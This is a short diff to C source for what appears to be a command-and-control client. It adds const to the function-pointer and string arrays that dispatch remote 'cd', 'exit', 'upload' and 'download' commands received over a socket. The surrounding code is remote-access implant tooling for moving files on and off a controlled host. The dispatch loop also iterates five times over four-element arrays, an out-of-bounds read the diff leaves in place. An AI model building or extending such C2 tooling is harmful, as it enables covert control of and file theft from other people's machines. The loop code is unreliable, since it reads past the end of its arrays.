@@ -268,9 +268,9 @@ int terminate_client(char* buf, size_t cmd_len, SOCKET client_socket) {
 // Function to return function pointer based on parsed command.
 func parse_cmd(char* buf) {
 	// Function pointer array of each c2 command.
-	func func_array[4] = { &client_cd, &terminate_client, &send_file, &recv_file };
+	const func func_array[4] = { &client_cd, &terminate_client, &send_file, &recv_file };
 	// Array of strings to be parsed.
-	char commands[4][10] = { "cd ", "exit", "upload ", "download " };
+	const char commands[4][10] = { "cd ", "exit", "upload ", "download " };
 
 	for (int i = 0; i < 5; i++) {
 		if (compare(buf, commands[i])) {
